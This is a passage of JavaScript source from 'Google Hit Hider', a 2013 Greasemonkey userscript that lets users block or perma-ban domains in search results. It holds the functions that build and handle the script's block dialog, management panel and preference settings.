    liel.removeChild(liel.getElementsByClassName("ghhd")[0]);
    elPar.parentNode.removeChild(elPar);
  }
  while (currentG.indexOf("google") < 0 && liel.nodeName != "DIV"){
    liel=liel.parentNode;
    if (liel.nodeName == "BODY") break;
  }
  if (currentG.indexOf("google") < 0 && liel.nodeName =="DIV" && liel.className.indexOf("ghh1time")>-1){
    liel.className = liel.className.replace(/\s*ghh1time/,"");
    liel.removeChild(liel.getElementsByClassName("ghhd")[0]);
    elPar.parentNode.removeChild(elPar);
  }
  hidehits(null,true);
  if (document.getElementById("ghhmngform")){
    if(document.getElementById("ghhmngform").style.display=="block") refreshSiteList();
  }
}
// Add domain to the Perma-ban list
function permban(e){
  if (!confirm("Never see hits for this domain again?")) return;
  var dpar, sdom, slist, liel;
  dpar = e.target.parentNode;
  sdom = dpar.getAttribute("dom");
  slist = GM_getValue("hideyhosts");
  if (slist.substr(0,1) != "|") slist = "|" + slist;
  slist = slist.replace("|"+sdom+":t","|"+sdom+":p");
  GM_setValue("hideyhosts",slist);
  blist = GM_getValue("hideyhosts");
  liel = dpar.parentNode;
  while (currentG.indexOf("google") > -1 && liel.nodeName != "LI"){
    liel=liel.parentNode;
    if (liel.nodeName == "BODY") break;
  }
  if (currentG.indexOf("google") > -1 && liel.nodeName == "LI" && liel.className.indexOf("ghh1time")>-1){
    liel.className = liel.className.replace(/\s*ghh1time/,"");
  }
  while (currentG.indexOf("google") < 0 && liel.nodeName != "DIV"){
    liel=liel.parentNode;
    if (liel.nodeName == "BODY") break;
  }
  if (currentG.indexOf("google") < 0 && liel.nodeName == "DIV" && liel.className.indexOf("ghh1time")>-1){
    liel.className = liel.className.replace(/\s*ghh1time/,"");
  }
  if(dpar.className.indexOf("ghhindent")>-1) dpar = dpar.parentNode;
  dpar.parentNode.removeChild(dpar);
  hidehits(null,true);
  if (document.getElementById("ghhmngform")){
    if(document.getElementById("ghhmngform").style.display=="block") refreshSiteList();
  }
}
// Close this bad result and rehide (to allow indendent open/close, do not run through hidehits)
function rehide(e){
  var dpar, liel, dompart, ael, j;
  dpar = e.target.parentNode;
  liel = dpar.parentNode;
  while (currentG.indexOf("google") > -1 && liel.nodeName != "LI"){
    liel=liel.parentNode;
    if (liel.nodeName == "BODY") break;
  }
  while (currentG.indexOf("google") < 0 && liel.nodeName != "DIV"){
    liel=liel.parentNode;
    if (liel.nodeName == "BODY") break;
  }
  dompart = dpar.getAttribute("dom");
  dpar.parentNode.removeChild(dpar);
  ael = liel.querySelector("h3 a, h2 a");
  if (!ael) ael = liel.querySelector("a");
  liel.className = liel.className.replace(/\s*ghh1time/,"");
  liel.removeChild(liel.querySelector("div.ghhd"));
  replaceHit(dompart,ael,liel,"");
  for (j=0; j<liel.children.length; j++){ // Hide Google result
    if (liel.children[j].className.indexOf("ghhider")<0 && liel.children[j].className.indexOf("ghhdnone")<0){
      if (liel.children[j].className.length > 0) liel.children[j].className += " ghhdnone";
      else liel.children[j].className = "ghhdnone";
    }
  }
}
// Functions relating to the Block form
function addBlockForm(){
  var bfd = document.createElement("div");
  bfd.id = "ghhblockform";
  bfd.className = "ghhpane";
  bfd.setAttribute("style","z-index:105;")
  bfd.innerHTML = "<form onsubmit=\"return false;\"><p style=\"margin:0.75em 0;\"><strong>Add to blocklist:</strong></p><p><label " +
    "style=\"white-space:pre\"><input type=\"radio\" name=\"ghhdom\" value=\"f\"> <span id=\"ghhfulldom\"></span></label><br>" +
    "<label><input type=\"radio\" name=\"ghhdom\" value=\"p\"> <span id=\"ghhpartdom\"></span></label></p>" +
    "<p style=\"text-align:center;white-space:pre;line-height:2em;margin:0.75em 0\"><button id=\"ghhbf1\" bt=\"t\"> " + txts.okbtn[0] + 
    " </button> <button id=\"ghhbf3\" bt=\"p\"> " + txts.okPbtn[0] + " </button><br>" +
    "<button id=\"ghhbf2\" mng=\"N\"> " + txts.cancelbtn[0] + " </button> " +
    "<button id=\"ghhbf4\" mng=\"Y\">" + txts.cancelMbtn[0] + "</button></p>";
  if (currentG.indexOf("google") > -1){
    bfd.innerHTML += "<p style=\"border-top:1px solid #aaa;text-align:center;white-space:pre;line-height:2em;margin:0.75em 0;padding-top:0.5em;\">Edit query: <button id=\"ghhbf5\" title=\"This site only\"> +site: </button> " +
    "<button id=\"ghhbf6\" title=\"Exclude this site\"> -site: </button></p>"
  }
  bfd.innerHTML += "<p style=\"margin:0.75em 0;\"><label title=\"Switch between showing and hiding result titles for regular blocked hits\"><input " +
    "type=\"checkbox\" name=\"chkshownotcbf\" id=\"chkshownotcbf\"> Show hidden hit notices</label><br>" +
    "<label title=\"Switch between block dialog and one-click blocking\"><input type=\"checkbox\" name=\"chk1clickbf\" " +
    "id=\"chk1clickbf\"> Enable 1-click blocking</label></p></form>";
  document.body.appendChild(bfd);
  document.getElementById("ghhbf1").addEventListener("click",addblock,false);
  document.getElementById("ghhbf2").addEventListener("click",ghhcloseform,false);
  document.getElementById("ghhbf3").addEventListener("click",addblock,false);
  document.getElementById("ghhbf4").addEventListener("click",ghhcloseform,false);
  if (currentG.indexOf("google") > -1){
    document.getElementById("ghhbf5").addEventListener("click",reQuery,false);
    document.getElementById("ghhbf6").addEventListener("click",reQuery,false);
  }
  document.getElementById("ghhblockform").addEventListener("click",ghhkillevent,false);
  document.getElementById("chkshownotcbf").addEventListener("change",updtpref,false);
  document.getElementById("chk1clickbf").addEventListener("change",updt1click,false);
}
function showbfd(e) {
  var bbtn, bfdiv, fdom, pdom, fspan, pspan, tdiv, lt;
  bbtn = e.target;
  fdom = bbtn.getAttribute("meta");
  if (!document.getElementById("ghhblockform")) addBlockForm();
  fspan = document.getElementById("ghhfulldom");
  fspan.textContent = fdom;
  fspan.previousElementSibling.checked = true;
  pdom = fdom.substr(fdom.indexOf(".")+1);
  pspan = document.getElementById("ghhpartdom");
  if (pdom.indexOf(".") > -1) {
    pspan.textContent = pdom;
    pspan.parentNode.style.display = "";
    switch (bAggress){
      case "all":
        pspan.previousElementSibling.checked = true;
      case "www":
        if (fdom.substr(0,3) == "www") pspan.previousElementSibling.checked = true;
      default:
        // default to full domain
    }
  } else {
    pspan.parentNode.style.display = "none";
  }
  if (e.altKey == true && currentG.indexOf("google") > -1){
    reQuery(); return;
  }
  bfdiv = document.getElementById("ghhblockform");
  tdiv = document.getElementById("ghhtemp");
  if (!tdiv){
    tdiv = document.createElement("div");
    tdiv.id = "ghhtemp";
  }
  lt = bbtn.offsetLeft + bbtn.offsetWidth + 12;
  if (bbtn.parentNode.previousElementSibling){
    if (window.getComputedStyle(bbtn.parentNode.previousElementSibling,null).getPropertyValue("float") != "none" ||
        (bbtn.style.position == "absolute" && bbtn.parentNode.nodeName == "TD")) lt=lt-bbtn.parentNode.offsetLeft;
  }
  if (currentG.indexOf("google") < 0) lt=lt-bbtn.parentNode.offsetLeft;
  tdiv.setAttribute("style", "position:relative;left:" +  lt + "px;top:-65px;z-index:100;width:250px;");
  if (bbtn.nextElementSibling){
    if (bbtn.nextElementSibling.nodeName == "DIV") bbtn.parentNode.insertBefore(tdiv,bbtn.nextElementSibling);
    else bbtn.parentNode.appendChild(tdiv);
  }
  else bbtn.parentNode.appendChild(tdiv);
  tdiv.appendChild(bfdiv);
  if (tdiv.parentNode.style.overflowX == "hidden" || tdiv.parentNode.style.overflowY == "hidden"){
    tdiv.parentNode.style.overflowX = "visible";
    tdiv.parentNode.style.overflowY = "visible";
  }
  if (pref1click.substr(0,1) == "Y" && e.shiftKey != true){ // 1-click; hold Shift to override
    if (pref1click.substr(2,1) == "N"){
      document.getElementById("ghhbf1").click();
    } else {
      document.getElementById("ghhbf3").click();    
    }
  } else { // regular + populating 1-click checkbox
    var chkBF = document.getElementById("chk1clickbf");
    if (pref1click.substr(0,1) == "Y"){
      chkBF.setAttribute("checked","checked");
      chkBF.checked = true;
    } else {
      chkBF.removeAttribute("checked");
      chkBF.checked = false;  
    }
    chkBF = document.getElementById("chkshownotcbf");
    if (showYN == "Y"){
      chkBF.setAttribute("checked","checked");
      chkBF.checked = true;
    } else {
      chkBF.removeAttribute("checked");
      chkBF.checked = false;  
    }
    bfdiv.style.display = "block";
    document.getElementById("ghhbf1").focus();
  }
  e.stopPropagation();
}
function addblock(e){
  var btype, els, i, sdom, tgt;
  tgt = e.target;
  btype = tgt.getAttribute("bt");
  els = tgt.form.querySelectorAll('input[type="radio"]');
  for (i=0; i<els.length; i++){
    if(els[i].checked == true){
      sdom = els[i].nextElementSibling.textContent;
      break; 
    } 
  }
  ghhcloseform(e);
  if (blist.substr(0,1) != "|") blist = "|" + blist;
  if (!btype) btype == "t";
  if (addAt == "end") blist += sdom + ":" + btype + "|";
  else blist = "|" + sdom + ":" + btype + blist;
  GM_setValue("hideyhosts",blist);
  hidehits(null,true);
  if (addAt == "sort") sortlist(null);
  if (document.getElementById("ghhmngform")){
    if(document.getElementById("ghhmngform").style.display=="block") refreshSiteList();
  }
}
function ghhcloseform(e){
  if (!e) return;
  if (typeof(e) == "object" && e.target){
    if(e.target.id.indexOf("ghhbf") == 0){
      var mng = e.target.getAttribute("mng");
      var bfdiv = document.getElementById("ghhblockform");
      var tdiv = document.getElementById("ghhtemp");
      bfdiv.style.display = "none";
      document.body.appendChild(bfdiv);
      tdiv.parentNode.removeChild(tdiv);
      if (mng == "Y") showManageForm("mngform");
    }
    if(e.target.id.indexOf("ghhmf") == 0){
      if (mbstyle.split("-")[0] == "mng") toggleBlockHiders("H");
      document.getElementById("ghhmngform").style.display = "none";
      if (mpopen.substr(0,3) == "Y-Y"){
        mpopen = "Y-N";
        ghhPrefO.mngpaneopen[0] = mpopen;
        GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
      }
    }  
  } else {
    if(e == "mngform"){
      if (mbstyle.split("-")[0] == "mng") toggleBlockHiders("H");
      document.getElementById("ghhmngform").style.display = "none";
      if (mpopen.substr(0,3) == "Y-Y"){
        mpopen = "Y-N";
        ghhPrefO.mngpaneopen[0] = mpopen;
        GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
      }
    }      
  }
  e.stopPropagation();
}
// Functions relating to the Manage Hiding button
function addMngBtn(){
  if (mbstyle.split("-")[0] == "blk") return;
  if (window.self != window.top) if (mbstyle.split("-")[1] == "ifrN") return;
  var mbtn;
  mbtn = document.createElement("button");
  mbtn.appendChild(document.createTextNode(txts.mngbtn[0]));
  mbtn.className="ghhider unbtn";
  mbtn.setAttribute("title","Manage Google Hit Hider Settings");
  mbtn.id = "ghhMngBtn";
  mbtn.addEventListener("click",showManageForm,true);
  document.body.appendChild(mbtn);
}
function undupMngBtn(){
  var unbtns = document.getElementsByClassName("unbtn");
  while (unbtns.length > 1){
    unbtns[unbtns.length - 1].parentNode.removeChild(unbtns[unbtns.length - 1]);
  }
}
function showManageForm(e){
  if (window.self != window.top) return;
  var mfd;
  if (!document.getElementById("ghhmngform")) addManageForm();
  mfd = document.getElementById("ghhmngform");
  if (mfd.style.display != "none" && e != "mngform"){ // Toggle to hidden
    if (mbstyle.split("-")[0] == "mng") toggleBlockHiders("H");
    if (mpopen.substr(0,3) == "Y-Y"){
      mpopen = "Y-N";
      ghhPrefO.mngpaneopen[0] = mpopen;
      GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
    }
    mfd.style.display = "none";
  } else {
    refreshSiteList();
    mfd.style.display = "block";
    if (mpopen.substr(0,3) == "Y-Y" && mpopen.length == 5){ // Restore last displayed tab
      var tabnum = mpopen.substr(4,1);
      if (document.getElementById("ghhmt"+tabnum).style.display == "none"){
        var synth = document.createEvent("MouseEvents");
        synth.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
        document.getElementById("ghhts"+tabnum).dispatchEvent(synth);
        if (mbstyle.split("-")[0] == "mng") toggleBlockHiders("S");
        if (typeof e == "object") e.target.blur();
        return
      }
    }
    if (document.getElementById("ghhmt1").style.display != "none" || document.getElementById("ghhmt4").style.display != "none"){
      document.getElementById("ghhmf1").setAttribute("disabled","disabled");
      document.getElementById("ghhutil").style.display == "none";
    }
    else {
      if (document.getElementById("ghhmf1").hasAttribute("disabled")) document.getElementById("ghhmf1").removeAttribute("disabled");
      if (bLUopen != "N") document.getElementById("ghhutil").style.display = "block";
    }
    setCurrentTab();
    if (mbstyle.split("-")[0] == "mng") toggleBlockHiders("S"); 
  }
  if (typeof e == "object") e.target.blur();
}
function setCurrentTab(){
  var k, tabnum;
  var tabset = document.querySelectorAll("#mflists>div");
  for (k=0; k<tabset.length; k++){
    tabnum = tabset[k].getAttribute("id");
    tabnum = tabnum.substr(tabnum.length-1);
    if (tabset[k].style.display != "none"){
      document.getElementById("ghhts"+tabnum).className = "ghhCurTab";
      if (mpopen.substr(0,1) == "Y"){
        mpopen = "Y-Y-"+tabnum;
        ghhPrefO.mngpaneopen[0] = mpopen;
        GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
      }
    }
    else document.getElementById("ghhts"+tabnum).className = "";
  }
}
// Functions relating to the Manage GHH form
function addManageForm(){
  var mfd = document.createElement("div");
  mfd.id = "ghhmngform";
  mfd.className = "ghhpane";
  mfd.setAttribute("style","display:none;");
  mfd.innerHTML = "<form onsubmit=\"return false;\"><div id=\"ghhtsdiv\">" +
    "<p style=\"margin:6px 0 -1px 0\" id=\"ghhtstrip\">" +
    "<button id=\"ghhts1\" title=\"General Use and Notices\">Home</button>" +
    "<button id=\"ghhts2\" title=\"Regular Block List\">Block</button>" +
    "<button id=\"ghhts3\" title=\"Perma-ban List\">Perma-ban</button>" +
    "<button id=\"ghhts4\" title=\"Manage Script Options\">Options</button></p></div>" +
    "<div id=\"mflists\" style=\"width:230px\">" +
    "<div id=\"ghhmt1\"><p>Welcome to Google Hit Hider!</p>" +
    "<div class=\"ghhtab\">" +
    "<p style=\"padding:0.25em;margin:0.25em\">Click the block button ( <button class=\"ghhider\" onclick=\"return false;\">" + txts.block[0] + "</button> ) " +
    "next to a hit title to block results from that site. A <b>regular</b> blocked hit becomes a one-line notation, " +
    "while a <b>Perma-ban</b> disappears completely.</p>" +
    "<p style=\"border-top:1px solid #000; padding:0.25em;margin:0.25em\"><label title=\"Switch between showing and hiding result titles " +
    "for regular blocked hits\"><input type=\"checkbox\" name=\"chkshownotc\" id=\"chkshownotc\"> Show hidden hit notices</label><br>" +
    "<label title=\"Switch between block dialog and one-click blocking\"><input type=\"checkbox\" name=\"chk1click\" " +
    "id=\"chk1click\"> Enable 1-click blocking</label></p>" +
    "<p style=\"border-top:1px solid #000; padding:0.25em;margin:0.25em\">v1.5.7 &copy; 2013 Jefferson Scher. Learn more on " +
    "<a href=\"http://userscripts.org/scripts/show/95205\">this script's page on userscripts.org</a>.</p></div></div>" +
    "<div id=\"ghhmt2\" style=\"display:none\"><p>Click to remove from regular block list:</p>" +
    "<div class=\"ghhtab\"><ul id=\"ghhsitelist\"></ul></div></div>\n" +
    "<div id=\"ghhmt3\" style=\"display:none\"><p>Click to remove from Perma-ban list:</p>" +
    "<div class=\"ghhtab\"><ul id=\"ghhpbanlist\"></ul></div></div>" +
    "<div id=\"ghhmt4\" style=\"display:none\"><p>Manage script options:</p>" +
    "<div class=\"ghhtab\" id=\"btnedit\">" +
    "<p id=\"addradios\">Add newly blocked domains:<br>" +
    "<label><input type=\"radio\" name=\"addpos\" value=\"end\"> at the end of the list</label><br>" +
    "<label><input type=\"radio\" name=\"addpos\" value=\"top\"> at the top of the list</label><br>" +
    "<label><input type=\"radio\" name=\"addpos\" value=\"sort\"> in alphabetical order</label></p>" +
    "<p id=\"aggressrads\" style=\"border-top:1px solid #000;padding-top:0.25em;margin-bottom:8px\">Block form defaults to:<br>" +
    "<label><input type=\"radio\" name=\"agglevel\" value=\"none\"> always the full domain</label><br>" +
    "<label><input type=\"radio\" name=\"agglevel\" value=\"all\"> always the partial domain</label><br>" +
    "<label><input type=\"radio\" name=\"agglevel\" value=\"www\"> partial domain for www only</label></p>" +
    "<p id=\"btnradios\" style=\"border-top:1px solid #000;padding-top:0.25em;margin-bottom:8px\">User interface style:<br>" +
    "<label><input type=\"radio\" name=\"uistyle\" value=\"both\"> Show Manage Hiding &amp; " + txts.block[0] + "</label><br>" +
    "<label>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=\"checkbox\" name=\"mbiframe\" id=\"mbiframe\"> Manage Hiding in iframes</label><br>" +
    "<label title=\"You can click a " + txts.block[0] + " button to open this dialog\"><input type=\"radio\" name=\"uistyle\" value=\"blk\"> Hide Manage Hiding button</label><br>" +
    "<label title=\"" + txts.block[0] + " buttons will appear only when this dialog is displayed\"><input type=\"radio\" name=\"uistyle\" value=\"mng\"> Hide " + txts.block[0] + " buttons</label><br>" +
    "Manage Hiding button position:<br>" +
    "<label><input type=\"radio\" name=\"mngbtnpos\" value=\"R\"> Side</label> " +
    "<label><input type=\"radio\" name=\"mngbtnpos\" value=\"T\"> Top</label> " +
    "<label><input type=\"radio\" name=\"mngbtnpos\" value=\"B\"> Bottom</label><br>" +
    "Display block buttons:<br>" +
    "<label><input type=\"radio\" name=\"blockdisp\" value=\"P\"> Always</label> " +
    "<label><input type=\"radio\" name=\"blockdisp\" value=\"M\"> On Mouseover</label><br>" +
    "Block button tooltips:<br>" +
    "<label><input type=\"radio\" name=\"blockttip\" value=\"Y\"> Full Detail</label> " +
    "<label><input type=\"radio\" name=\"blockttip\" value=\"N\"> None</label></p>" +
    "<p id=\"miscpref\" style=\"border-top:1px solid #000;padding-top:0.25em;margin-bottom:8px\">Misc Preferences:<br>" +
    "<label><input type=\"checkbox\" name=\"chkajax\" id=\"chkajax\"> Instant/AJAX/Autopager</label><br>" +
    "<label><input type=\"checkbox\" name=\"chkdom4\" id=\"chkdom4\"> DOM4 Mutation Observer</label><br>" +
    "<label><input type=\"checkbox\" name=\"chkmpopen\" id=\"chkmpopen\"> Re-open Management Pane</label><br>" +
    "<label><input type=\"checkbox\" name=\"chk1pban\" id=\"chk1pban\"> 1-click to Perma-ban list</label><br>" +
    "<label title=\"Try out features that haven't been completely tested\"><input type=\"checkbox\" name=\"chkbeta\" " +
    "id=\"chkbeta\"> Enable beta features</label></p>" +
    "<p style=\"border-top:1px solid #000;padding-top:0.25em;margin-bottom:8px\">Edit captions:</p>" +
    "<p><button class=\"ghhider\" id=\"ghhedit1\" key=\"block\">" + txts.block[0] + "</button> " +
    "<button class=\"ghhider\" id=\"ghhedit3\" key=\"unblock\" style=\"background:#9f6\">" + txts.unblock[0] + "</button> " +
    "<button class=\"ghhider\" id=\"ghhedit2\" key=\"pban\" style=\"background:#f66\">" + txts.pban[0] + "</button></p>" + 
    "<p><i>Reload to complete changes</i></p><p><button id=\"ghhmfr\">Restore default captions</button></p></div></div>" +
    "</div><p style=\"text-align:center;white-space:pre;margin:1em 0\">" +
    "<button id=\"ghhmf1\">" + txts.savebtn[0] + "<span id=\"numchgs\"></span></button> " +
    "<button id=\"ghhmf3\" title=\"Display additional buttons for list management\">List Util" +  
    "</button> <button id=\"ghhmf2\">" + txts.closebtn[0] + "</button></p><p id=\"ghhutil\" style=\"display:none\">" +
    "<button id=\"ghhmf4\" title=\"Display block list for copying to backup or share\">" + 
    txts.eximbtn[0] + "</button> <button id=\"ghhmf7\" title=\"Import domains to the block list\">" + 
    txts.impobtn[0] + "</button> <button id=\"ghhmf8\" title=\"Post block list to the web\" disabled=\"disabled\">" + 
    txts.sharebtn[0] + "</button><br /><button id=\"ghhmf5\" title=\"Sort list in alphabetical order\">" + 
    txts.sortbtn[0] + "</button> <button id=\"ghhmf6\" title=\"De-duplicate block list by removing unnecessary domains\">" + 
    txts.dedupbtn[0] + "</button> <button id=\"ghhmf9\" title=\"Remove www from blocked domains\">" + 
    txts.unwwwbtn[0] + "</button></p></form>";
  document.body.appendChild(mfd);
  fixShowHideBtn();
  fixuistyle();
  fixaddpos();
  fixaggblock();
  fixajaxstyle();
  fixpanepersist();
  fix1clickstyle();
  fixBeta();
  document.getElementById("ghhts1").addEventListener("click",togglelist,true); // tabs
  document.getElementById("ghhts2").addEventListener("click",togglelist,true);
  document.getElementById("ghhts3").addEventListener("click",togglelist,true);
  document.getElementById("ghhts4").addEventListener("click",togglelist,true);
  document.getElementById("chkshownotc").addEventListener("change",updtpref,true); // home
  document.getElementById("chk1click").addEventListener("change",updt1click,true);
  document.getElementById("ghhsitelist").addEventListener("click",togglesite,true); // block
  document.getElementById("ghhpbanlist").addEventListener("click",togglesite,true); // pban
  document.getElementById("addradios").addEventListener("change",updtaddpos,true); // options
  document.getElementById("aggressrads").addEventListener("change",updtaggress,true);
  document.getElementById("chkajax").addEventListener("change",updtAJAX,true);
  document.getElementById("chkdom4").addEventListener("change",updtAJAX,true);
  document.getElementById("chkmpopen").addEventListener("change",updtpersist,true);
  document.getElementById("chk1pban").addEventListener("change",updt1click,true);
  document.getElementById("chkbeta").addEventListener("change",updtBeta,true);
  document.getElementById("btnradios").addEventListener("change",updtuistyle,true);
  document.getElementById("ghhedit1").addEventListener("click",chgcaption,true);
  document.getElementById("ghhedit2").addEventListener("click",chgcaption,true);
  document.getElementById("ghhedit3").addEventListener("click",chgcaption,true);
  document.getElementById("ghhmfr").addEventListener("click",resetTextStrings,true);
  document.getElementById("ghhmf1").addEventListener("click",saveedits,true); // buttons
  document.getElementById("ghhmf2").addEventListener("click",ghhcloseform,true);
  document.getElementById("ghhmf3").addEventListener("click",toggleListUtil,true);
  document.getElementById("ghhmf4").addEventListener("click",exportlist,true);
  document.getElementById("ghhmf5").addEventListener("click",sortlist,true);
  document.getElementById("ghhmf6").addEventListener("click",dedup,true);
  document.getElementById("ghhmf7").addEventListener("click",importlist,true);
  document.getElementById("ghhmf9").addEventListener("click",unwww,true);
}
function togglelist(e){ // Change tabs
  e.target.blur();
  if (e.target.className == "ghhCurTab") return;
  var tabbtns = document.querySelectorAll("#ghhtstrip>button");
  var k, tabnum;
  for (k=0; k<tabbtns.length; k++){
    tabnum = tabbtns[k].id;
    tabnum = tabnum.substr(tabnum.length-1);
    if (e.target.id == tabbtns[k].id){
      document.getElementById("ghhmt"+tabnum).style.display = "";
    } else {
      document.getElementById("ghhmt"+tabnum).style.display = "none";
    }
  }
  if (document.getElementById("ghhmt1").style.display != "none" || document.getElementById("ghhmt4").style.display != "none"){
    document.getElementById("ghhmf1").setAttribute("disabled","disabled");
    document.getElementById("ghhutil").style.display = "none";
  } else {
    if (document.getElementById("ghhmf1").hasAttribute("disabled")) document.getElementById("ghhmf1").removeAttribute("disabled");
    if (bLUopen != "N") document.getElementById("ghhutil").style.display = "block";
  }
  setCurrentTab();
}
function toggleListUtil(e){ // Display/close extra set of buttons
  e.target.blur();
  var p = document.getElementById("ghhutil");
  if (!p) return;
  // If not displaying a list now, move to a list
  if (document.getElementById("ghhmt1").style.display != "none" || document.getElementById("ghhmt4").style.display != "none"){
    var synth = document.createEvent("MouseEvents");
    synth.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
    document.getElementById("ghhts2").dispatchEvent(synth);
    p.style.display = "block";  // Always open button pane
    bLUopen = "Y";
  } else {
    if (p.style.display != "block"){  // Toggle when list already was displayed
      p.style.display = "block";
      bLUopen = "Y";
    } else {
      p.style.display = "none";
      bLUopen = "N";
    }
  }
}
function togglesite(e){ // Designate list items for unblock, pban or block
  var t, l, s, pid;
  t = e.target;
  if (t.className == "ghhinfo") t = t.nextElementSibling;
  l = t.parentNode;
  pid = l.parentNode.id;
  switch (t.className){
    case "ghhhost ghhpb":
      t.className = "ghhhost ghhblk";  // toggle to block
      if (l.nodeName == "LI"){
        if (pid == "ghhsitelist"){
          l.children[0].style.display = "none";
          listchgs = listchgs - 1;
        } else {
          l.children[0].style.display = "inline";
          l.children[0].textContent = "to " + txts.block[0];
          l.children[0].style.backgroundColor = "#ccc";
          listchgs = listchgs + 1;
        }
      }
      break;
    case "ghhhost ghhdel":
      t.className = "ghhhost ghhpb";   // toggle to perma-ban
      if (l.nodeName == "LI"){
        if (pid == "ghhpbanlist"){
          l.children[0].style.display = "none";
          listchgs = listchgs - 1;
        } else {
          l.children[0].style.display = "inline";
          l.children[0].textContent = "to " + txts.pban[0];
          l.children[0].style.backgroundColor = "#f66";
        }
      }
      break;
    default:
      t.className = "ghhhost ghhdel";  // toggle to unblock
      if (l.nodeName == "LI"){
        l.children[0].style.display = "inline";
        l.children[0].textContent = "to " + txts.unblock[0];
        l.children[0].style.backgroundColor = "#9f6";
        if (pid == "ghhsitelist"){
          listchgs = listchgs + 1;
        }
      }
  }
}
function saveedits(e){  // Save changes made on tabs 2 and 3
  if (e){
    if (listchgs == 0){
      if (!confirm("No changes detected. Save anyway?")){
        e.target.blur();
        return;
      }
    } else {
      if (!confirm("Save changes to block list?")){
        e.target.blur();
        return;
      }
    }
  } 
  var slist, i, sp, ttemp, ptemp;
  slist = document.getElementById("ghhsitelist");
  ttemp = "";
  ptemp = "";
  for (i=0;i<slist.children.length;i++){
    if (slist.children[i].nodeName == "LI") {
      sp = slist.children[i].children[1];
      switch (sp.className){
        case "ghhhost ghhblk":
          ttemp += sp.textContent + ":t|";
          break;
        case "ghhhost ghhpb":
          ptemp += sp.textContent + ":p|";
          break;
        default:
          // to be unblocked
      }
    }
  }
  slist = document.getElementById("ghhpbanlist");
  for (i=0;i<slist.children.length;i++){
    if (slist.children[i].nodeName == "LI") {
      sp = slist.children[i].children[1];
      switch (sp.className){
        case "ghhhost ghhblk":
          ttemp += sp.textContent + ":t|";
          break;
        case "ghhhost ghhpb":
          ptemp += sp.textContent + ":p|";
          break;
        default:
          // to be unblocked
      }
    }
  }
  GM_setValue("hideyhosts", "|" + ttemp + ptemp);
  blist = GM_getValue("hideyhosts");
  hidehits(null,true);
  refreshSiteList();  
  listchgs = 0;
  if (e) e.target.blur();
}
function refreshSiteList(){ // Rebuild lists for tabs 2 and 3
  var sarray, slist, pblist, i, j, k, litem;
  if (blist.substr(0,1) != "|") blist = "|" + blist;
  sarray = blist.substr(1).split("|");
  slist = document.getElementById("ghhsitelist");
  slist.innerHTML = "";
  pblist = document.getElementById("ghhpbanlist");
  pblist.innerHTML = "";
  j = 0; k = 0;
  for (i=0; i<sarray.length-1; i++){
    if (sarray[i].indexOf(":p")<0) {
      litem = document.createElement("li");
      if(sarray[i].indexOf(":")>0){
        litem.innerHTML = "<span class=\"ghhinfo\"></span><span class=\"ghhhost ghhblk\">" + sarray[i].substr(0, sarray[i].indexOf(":")) + "</span>";
      } else{
        litem.innerHTML = "<span class=\"ghhinfo\"></span><span class=\"ghhhost ghhblk\">" + sarray[i] + "</span>";
      }
      if (j % 2 == 0) litem.style.background = "#fcfcaa";
      slist.appendChild(litem);
      j += 1; 
    } else {
      litem = document.createElement("li");
      litem.innerHTML = "<span class=\"ghhinfo\"></span><span class=\"ghhhost ghhpb\">" + sarray[i].substr(0, sarray[i].indexOf(":")) + "</span>";
      if (k % 2 == 0) litem.style.background = "#fcfcaa";
      pblist.appendChild(litem);
      k += 1; 
    }
  }
}
function updtaddpos(e){ // Implement change for radio buttons re where to add to list
  var rads = e.target.parentNode.querySelectorAll("input[type='radio']");
  for (var i=0; i<rads.length; i++){
    if (rads[i].checked){
      if (rads[i].value == "sort"){
        if(confirm("Sort lists now? Sorting is irreversible.")){
          if (listchgs > 0) {
            if (confirm("You have unsaved changes to your lists. Save changes and sort, or cancel sorting?")){
              saveedits(null);
            } else {
              fixaddpos();
              return;
            }
          }
          sortlist(null);
        } else {
          fixaddpos();
          return;
        }
      }
      addAt = rads[i].value;
      ghhPrefO.addtolistpos[0] = addAt;
      GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
      break;
    }
  }
  fixaddpos();
}
function fixaddpos(){ // Check appropriate radio button re where to add to list
  var rads = document.getElementById("addradios").querySelectorAll("input[type='radio']");
  for (i=0; i<rads.length; i++){
    if (rads[i].value == addAt){
      rads[i].setAttribute("checked","checked");
      rads[i].checked = true;
    }
    else{
      if (rads[i].hasAttribute("checked")){
        rads[i].removeAttribute("checked");
        rads[i].checked = false;
      }
    }
  }
}
function updtaggress(e){ // Implement change for radio buttons re default domain to block
  var rads = e.target.parentNode.querySelectorAll("input[type='radio']");
  for (var i=0; i<rads.length; i++){
    if (rads[i].checked){
      bAggress = rads[i].value;
      ghhPrefO.aggressiveblock[0] = bAggress;
      GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
      break;
    }
  }
  fixaggblock();
}
function fixaggblock(){ // Check appropriate radio button re default domain to block
  var rads = document.getElementById("aggressrads").querySelectorAll("input[type='radio']");
  for (i=0; i<rads.length; i++){
    if (rads[i].value == bAggress){
      rads[i].setAttribute("checked","checked");
      rads[i].checked = true;
    }
    else{
      if (rads[i].hasAttribute("checked")){
        rads[i].removeAttribute("checked");
        rads[i].checked = false;
      }
    }
  }
}
function updtuistyle(e){ // Store settings for buttons to display
  var mbparts = mbstyle.split("-");
  if (mbparts.length == 1) mbparts.push("ifrN");
  if (mbparts.length == 2) mbparts.push("R");
  if (mbparts.length == 3) mbparts.push("P");
  if (mbparts.length == 4) mbparts.push("Y");
  if (e.target.id == "mbiframe") { // Handle iframe checkbox
    var chk = e.target;
    if (chk.checked){
      mbparts[1] = "ifrY";
    } else {
      mbparts[1] = "ifrN";
    }
    mbstyle = mbparts.join("-");
    ghhPrefO.mngbtnstyle[0] = mbstyle;
    GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
  } else { // Handle radio buttons
    if (e.target.getAttribute("name") == "uistyle"){
      var rads = e.target.parentNode.querySelectorAll("input[name='uistyle']");
      for (var i=0; i<rads.length; i++){
        if (rads[i].checked){
          switch (rads[i].value){
            case "blk":
              mbparts[0] = rads[i].value;
